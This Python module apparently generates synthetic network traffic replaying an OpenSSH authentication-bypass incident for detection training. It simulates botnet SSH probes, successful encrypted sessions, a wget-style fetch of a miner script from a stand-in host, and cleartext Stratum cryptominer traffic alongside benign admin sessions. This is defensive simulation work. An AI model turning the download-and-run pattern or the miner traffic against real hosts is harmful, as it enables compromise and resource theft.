"""netgen.openssh_sshole -- the "OpenSSH 'SSHole' authentication bypass (CVE-2026-123158)" replay.

A replay of the OpenSSH flaw on musl-based Linux without PAM (fixed in 10.6p2): a password
login for an account whose password field holds only "*" succeeds against a second local account's hash.
Exploitation began within hours of the patch, from botnets and cryptominers; most successful chains wrote
no files.

What a sensor sees (SSH is encrypted, so the signal is shape and fingerprints, as in the real incident):
  * an internet-wide wave of short SSH connections from several sources, each with a DIFFERENT client
    library (Go, libssh2, paramiko -- distinct banners and distinct KEXINIT lists, hence distinct HASSH),
    one to three auth exchanges and a server-side disconnect, against one Alpine/musl host;
  * a few of those connections succeed and stay open: a longer session with command-shaped traffic;
  * the compromised host then fetches a script over plain HTTP, resolves a first-seen mining-pool name and
    speaks cleartext Stratum JSON-RPC (login, jobs, periodic share submissions) on :3333 -- the cryptominer
    signature -- while administrators' ordinary OpenSSH sessions from the management host continue.

Registered as ``ir-openssh-sshole-cve123158`` (category IR), a SIBLING of the other IR replays.

PIN-SAFE: hosts are injected inside ``build()``; a build that does not select this scenario is
byte-for-byte the baseline.
"""
import json
import os
import struct

from netgen import flows as F
from netgen import protocols as P
from netgen.identity import H
from netgen import packkit as K

from netgen.netscaler import phases as NSP

rng = NSP.rng

_HOST_SUFFIX, _HOST_IP, _HOST_MAC = "ALP1", "10.10.20.128", "00:50:56:bb:12:80"
_EXTERNAL = {
    "bot1": ("scan-a.probe-pool.example", "203.0.113.151", 12),
    "bot2": ("scan-b.probe-pool.example", "203.0.113.152", 15),
    "bot3": ("scan-c.probe-pool.example", "203.0.113.153", 9),
    "bot4": ("scan-d.probe-pool.example", "203.0.113.154", 18),
    "bot5": ("scan-e.probe-pool.example", "203.0.113.155", 11),
    "pool": ("pool.xmr-mirror.example", "192.0.2.150", 13),          # Stratum sink
    "payload": ("dl.cdn-assets-sync.example", "192.0.2.153", 10),    # plain-HTTP script host
}
_SERVER_BANNER = b"SSH-2.0-OpenSSH_10.5\r\n"

# client library -> (banner, kex, hostkey, enc, mac, comp). Names are the libraries' real defaults, lightly
# abridged; each set differs from the others and from the OpenSSH admin client, which is what HASSH keys on.
_CLIENTS = {
    "go": (b"SSH-2.0-Go\r\n",
           "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
           "diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c",
           "rsa-sha2-256,rsa-sha2-512,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519",
           "aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr",
           "hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96",
           "none"),
    "libssh2": (b"SSH-2.0-libssh2_1.10.0\r\n",
                "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                "diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1",
                "ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ssh-dss",
                "aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc",
                "hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160",
                "none"),
    "paramiko": (b"SSH-2.0-paramiko_3.4.0\r\n",
                 "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                 "diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,"
                 "diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1",
                 "ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ssh-dss",
                 "aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,aes192-cbc,aes256-cbc,3des-cbc",
                 "hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-md5,hmac-sha1-96,hmac-md5-96",
                 "none,zlib@openssh.com,zlib"),
}


def _nl(s):
    b = s.encode()
    return struct.pack("!I", len(b)) + b


def _kexinit(kex, hk, enc, mac, comp):
    payload = (b"\x14" + os.urandom(16) + _nl(kex) + _nl(hk) + _nl(enc) + _nl(enc) + _nl(mac) + _nl(mac)
               + _nl(comp) + _nl(comp) + _nl("") + _nl("") + b"\x00" + b"\x00\x00\x00\x00")
    return P.ssh_packet(payload)


def _inject_hosts(ctx):
    host = K.add_internal(ctx, _HOST_SUFFIX, _HOST_IP, _HOST_MAC, "Linux (Alpine 3.20, musl)", "ssh", "lnx-alpine")
    return K.add_externals(ctx, "_sshole_ext", _EXTERNAL, rng), host


def _ssh_open(ctx, src, host, ts, lib):
    """TCP + banner exchange + KEXINIT pair + curve25519 key exchange for one client library. Returns the
    live session positioned after NEWKEYS."""
    banner, kex, hk, enc, mac, comp = _CLIENTS[lib]
    out = ctx.arp_for(src, host, ts, vantage=host)
    s = ctx.tcp(src, host, 22, ts + 0.001, vantage=host).handshake()
    s.c2s(banner, think=0.002)
    s.s2c(_SERVER_BANNER, think=0.003)
    s.c2s(_kexinit(kex, hk, enc, mac, comp), think=0.002)
    s.s2c(NSP.wire.ssh_kexinit(False), think=0.002)
    s.c2s(P.ssh_ecdh_init(), think=0.003)
    s.s2c(P.ssh_ecdh_reply() + P.ssh_newkeys(), think=0.004)
    s.c2s(P.ssh_newkeys(), think=0.002)
    s._pre = out
    return s


def bot_probe(ctx, src, host, lib, tries, ts=None):
    """One automated login attempt: key exchange, `tries` password exchanges that fail, then the server's
    disconnect. Real clients make one to a few; encrypted sizes follow SSH_MSG_USERAUTH framing."""
    s = _ssh_open(ctx, src, host, ts, lib)
    s.c2s(P.ssh_encrypted(44), think=rng.uniform(0.003, 0.02))            # SERVICE_REQUEST(ssh-userauth)
    s.s2c(P.ssh_encrypted(60), think=rng.uniform(0.002, 0.01))
    for _ in range(tries):
        s.c2s(P.ssh_encrypted(rng.choice((92, 108, 124))), think=rng.uniform(0.02, 0.25))
        s.s2c(P.ssh_encrypted(52), think=rng.uniform(0.01, 0.15))         # USERAUTH_FAILURE
    s.s2c(P.ssh_encrypted(52), think=rng.uniform(0.05, 0.5))              # DISCONNECT
    return F.merged(s._pre, s.close(by_client=False, think=rng.uniform(0.002, 0.02)))


def bot_success(ctx, src, host, lib, seconds, ts=None):
    """A bypass that worked: the same key exchange, a successful auth, a channel open and an exec request,
    then a minutes-long session with command-shaped bidirectional traffic."""
    s = _ssh_open(ctx, src, host, ts, lib)
    for c, r in ((44, 60), (108, 52), (92, 36), (172, 44), (220, 100)):    # auth, success, channel open, exec
        s.c2s(P.ssh_encrypted(c), think=rng.uniform(0.01, 0.12))
        s.s2c(P.ssh_encrypted(r), think=rng.uniform(0.005, 0.08))
    t_end = s.t + seconds
    while s.t < t_end:
        s.c2s(P.ssh_encrypted(rng.choice((36, 52, 84, 148))), think=rng.uniform(0.2, 2.5))
        s.s2c(P.ssh_encrypted(rng.choice((52, 164, 540, 1200))), think=rng.uniform(0.01, 0.3))
    return F.merged(s._pre, s.close(by_client=True, think=rng.uniform(0.02, 0.2)))


def script_fetch(ctx, host, payload, ts=None):
    """The compromised host pulls a shell script over plain HTTP (DNS first, wget user-agent)."""
    dc = ctx.h.get(H("DC1"))
    pre = F.dns_lookup(ctx, host, payload.fqdn, ts, external=True, answers=[(P.DNS_A, payload.ipb)], dc=dc) if dc else []
    t = ts + 0.06
    out = ctx.arp_for(host, payload, t, vantage=host)
    s = ctx.tcp(host, payload, 80, t + 0.001, vantage=host).handshake()
    s.c2s(("GET /a/x86_64/m.sh HTTP/1.1\r\nHost: %s\r\nUser-Agent: Wget\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n"
           % payload.fqdn).encode(), think=0.01)
    body = (b"#!/bin/sh\n# fetch and run the miner\n" + b"".join(b"# %s\n" % os.urandom(20).hex().encode() for _ in range(rng.randint(30, 60))))
    s.s2c(P.http_response("200 OK", body, "text/x-shellscript", s.t, server="nginx"), think=rng.uniform(0.03, 0.12))
    return F.merged(pre, out, s.close(by_client=True, think=rng.uniform(0.02, 0.1)))


def _j(obj):
    return (json.dumps(obj, separators=(",", ":")) + "\n").encode()


def stratum_session(ctx, host, pool, minutes, ts=None):
    """A cryptominer talking cleartext Stratum JSON-RPC on :3333: DNS for the pool name, login, a job,
    then periodic share submissions (each answered OK) and fresh jobs, as an XMRig-class miner does."""
    dc = ctx.h.get(H("DC1"))
    pre = F.dns_lookup(ctx, host, pool.fqdn, ts, external=True, answers=[(P.DNS_A, pool.ipb)], dc=dc) if dc else []
    t = ts + 0.06
    out = ctx.arp_for(host, pool, t, vantage=host)
    s = ctx.tcp(host, pool, 3333, t + 0.001, vantage=host).handshake()
    wallet = "4" + "".join(rng.choice("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz") for _ in range(94))
    sess = os.urandom(8).hex()
    s.c2s(_j({"id": 1, "jsonrpc": "2.0", "method": "login",
              "params": {"login": wallet, "pass": "x", "agent": "XMRig/6.21.0 (Linux x86_64) libuv/1.46.0 gcc/13.2.1",
                         "algo": ["rx/0", "rx/wow", "cn/r"]}}), think=0.01)

    def job():
        return {"job_id": os.urandom(8).hex(), "blob": os.urandom(76).hex(), "target": "b88d0600", "algo": "rx/0",
                "height": rng.randint(3300000, 3340000), "seed_hash": os.urandom(32).hex()}
    s.s2c(_j({"id": 1, "jsonrpc": "2.0", "error": None,
              "result": {"id": sess, "job": job(), "extensions": ["algo", "keepalive"], "status": "OK"}}), think=rng.uniform(0.03, 0.15))
    t_end = s.t + minutes * 60
    n = 2
    while s.t < t_end:
        s.idle(rng.uniform(18, 55))
        s.c2s(_j({"id": n, "jsonrpc": "2.0", "method": "submit",
                  "params": {"id": sess, "job_id": os.urandom(8).hex(), "nonce": os.urandom(4).hex(), "result": os.urandom(32).hex(), "algo": "rx/0"}}),
              think=0.005)
        s.s2c(_j({"id": n, "jsonrpc": "2.0", "error": None, "result": {"status": "OK"}}), think=rng.uniform(0.04, 0.2))
        n += 1
        if rng.random() < 0.4:
            s.s2c(_j({"jsonrpc": "2.0", "method": "job", "params": job()}), think=rng.uniform(0.05, 0.3))
    return F.merged(pre, out, s.close(by_client=True, think=rng.uniform(0.05, 0.3)))


def admin_ssh(ctx, mgmt, host, ts=None):
    """Benign look-alike: an administrator's OpenSSH session (different HASSH from the botnet clients)."""
    return F.ssh_session(ctx, mgmt, host, ts, rng.uniform(30, 300), server_banner="SSH-2.0-OpenSSH_10.5")


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-123158 incident: a wave of one-to-three-try probes from five sources across the
    window, three bypass successes, then script fetch + Stratum mining from the compromised host, with the
    administrators' normal OpenSSH sessions to the same host running throughout."""
    ext, host = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))
    libs = ("go", "libssh2", "paramiko")

    # ---- the wave: many short failed probes, each source with its own client library ----
    for i, key in enumerate(("bot1", "bot2", "bot3", "bot4", "bot5")):
        t = lo + 30 + i * 11
        for _ in range(max(10, int(round(60 * scale)) + 10)):
            s(t, bot_probe, ext[key], host, libs[i % 3], rng.choice((1, 1, 2, 3)))
            t += rng.uniform(4, 28)
    # ---- the bypass lands: three successful, longer sessions ----
    for off, key, lib in ((900, "bot3", "libssh2"), (1010, "bot1", "go"), (1500, "bot5", "paramiko")):
        s(lo + off, bot_success, ext[key], host, lib, rng.uniform(40, 180))
    # ---- follow-on: script fetch, then the miner's Stratum session for the rest of the window ----
    s(lo + 960, script_fetch, host, ext["payload"])
    s(lo + 1040, stratum_session, host, ext["pool"], max(3.0, (hi - lo - 1100) / 60.0))

    # ---- benign look-alike: administrators' OpenSSH sessions from the management host ----
    mgmt = ctx.h.get(H("MGMT1"))
    if mgmt is not None:
        for _ in range(max(3, int(round(6 * scale)) + 3)):
            s(lo + rng.uniform(0, max(1.0, hi - lo - 400)), admin_ssh, mgmt, host)
